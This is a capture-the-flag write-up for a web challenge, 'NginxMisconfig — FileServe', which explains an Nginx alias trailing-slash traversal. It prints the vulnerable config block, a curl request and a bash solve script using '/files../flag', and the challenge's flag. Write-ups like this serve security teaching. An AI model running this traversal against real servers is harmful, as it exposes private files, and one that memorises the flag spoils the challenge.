---
title: "NginxMisconfig — FileServe"
ctf: "CyberStrike"
date: 2026-07-11
category: web
difficulty: very-hard
points: 450
flag_format: "cyberstrike{...}"
author: "retr0"
---

# NginxMisconfig — FileServe

## Summary

A static file host serves files under `/files/` via an Nginx `location` block
that omits a trailing slash while its `alias` directive has one. The trailing-slash
mismatch lets the path remainder be appended unsafely, enabling `..` traversal out
of the intended directory to read an out-of-tree `flag` file.

## Solution

### Step 1: Spot the trailing-slash mismatch

The app advertises files served from `/files/`, but the title ("NginxMisconfig")
and challenge description point to a classic Nginx `alias` trailing-slash bug:

```nginx
# Vulnerable shape (inferred):
location /files {            # no trailing slash
    alias /var/www/html/files/;   # trailing slash
}
```

When the location prefix has no trailing slash but the alias does, Nginx takes
the part of the URI after the matched prefix and appends it to the alias. So
`/files../flag` becomes `alias + "../flag"` = `/var/www/html/flag`, escaping
the `files/` directory.

### Step 2: Traverse out and read the flag

```bash
curl -s http://chal.csc-snist.live:40720/files../flag
```

Output:

```
cyberstrike{13faddc6e12ad120da3e8f9a2478ef46}
```

A single complete solving script:

```bash
#!/usr/bin/env bash
# Usage: ./solve.sh [host] [port]
host="${1:-chal.csc-snist.live}"
port="${2:-40720}"
curl -s "http://${host}:${port}/files../flag"
```

## Flag

```
cyberstrike{13faddc6e12ad120da3e8f9a2478ef46}
```